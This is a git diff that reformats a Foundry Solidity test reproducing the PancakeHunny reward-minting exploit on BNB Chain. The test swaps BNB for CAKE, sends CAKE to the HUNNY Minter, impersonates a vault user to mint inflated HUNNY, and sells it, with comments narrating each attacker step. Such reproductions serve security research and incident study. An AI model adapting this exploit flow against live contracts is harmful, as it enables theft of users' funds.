@@ -21,18 +21,19 @@ import {IERC20} from "src/interfaces/IERC20.sol";
         uint hunnyBNBAmount = tokenToHunnyBNB(flip, IBEP20(flip).balanceOf(address(this)));  // incorrect use balanceOf.*/
 
 interface CakeFlipVault {
+
     function getReward() external;
     function withdraw(uint256 amount) external;
     function rewards(address) external view returns (uint256);
+
 }
 
 contract ContractTest is Test {
-    IPancakeRouter pancakeRouter =
-        IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
+
+    IPancakeRouter pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
 
     address hunnyMinter = 0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300;
-    CakeFlipVault cakeVault =
-        CakeFlipVault(0x12180BB36DdBce325b3be0c087d61Fce39b8f5A4);
+    CakeFlipVault cakeVault = CakeFlipVault(0x12180BB36DdBce325b3be0c087d61Fce39b8f5A4);
 
     IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
     IERC20 cake = IERC20(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82);
@@ -53,18 +54,9 @@ contract ContractTest is Test {
         address[] memory path = new address[](2);
         path[0] = address(wbnb);
         path[1] = address(cake);
-        pancakeRouter.swapExactETHForTokens{value: 5.752 ether}(
-            0,
-            path,
-            address(this),
-            1_622_687_689
-        );
+        pancakeRouter.swapExactETHForTokens{value: 5.752 ether}(0, path, address(this), 1_622_687_689);
 
-        emit log_named_decimal_uint(
-            "Swap cake, Cake Balance",
-            cake.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("Swap cake, Cake Balance", cake.balanceOf(address(this)), 18);
 
         //The attacker sent CAKE to our HUNNY Minter contract
         cake.transfer(hunnyMinter, 59_880_957_483_227_401_400);
@@ -73,35 +65,19 @@ contract ContractTest is Test {
         vm.startPrank(0x515Fb5a7032CdD688B292086cf23280bEb9E31B6);
         //HUNNY Minter was “tricked” to mint more HUNNY tokens
         cakeVault.getReward();
-        hunny.transfer(
-            address(this),
-            hunny.balanceOf(address(0x515Fb5a7032CdD688B292086cf23280bEb9E31B6))
-        );
-        emit log_named_decimal_uint(
-            "Hunny Balance",
-            hunny.balanceOf(address(this)),
-            18
-        );
+        hunny.transfer(address(this), hunny.balanceOf(address(0x515Fb5a7032CdD688B292086cf23280bEb9E31B6)));
+        emit log_named_decimal_uint("Hunny Balance", hunny.balanceOf(address(this)), 18);
         vm.stopPrank();
 
         //The attacker then sold the HUNNY tokens on PancakeSwap
         address[] memory path2 = new address[](2);
         path2[0] = address(hunny);
         path2[1] = address(wbnb);
-        pancakeRouter.swapExactTokensForETH(
-            hunny.balanceOf(address(this)),
-            0,
-            path2,
-            address(this),
-            1_622_687_089
-        );
+        pancakeRouter.swapExactTokensForETH(hunny.balanceOf(address(this)), 0, path2, address(this), 1_622_687_089);
 
-        emit log_named_decimal_uint(
-            "Swap WBNB, WBEB Balance",
-            wbnb.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("Swap WBNB, WBEB Balance", wbnb.balanceOf(address(this)), 18);
     }
 
     receive() external payable {}
+
 }
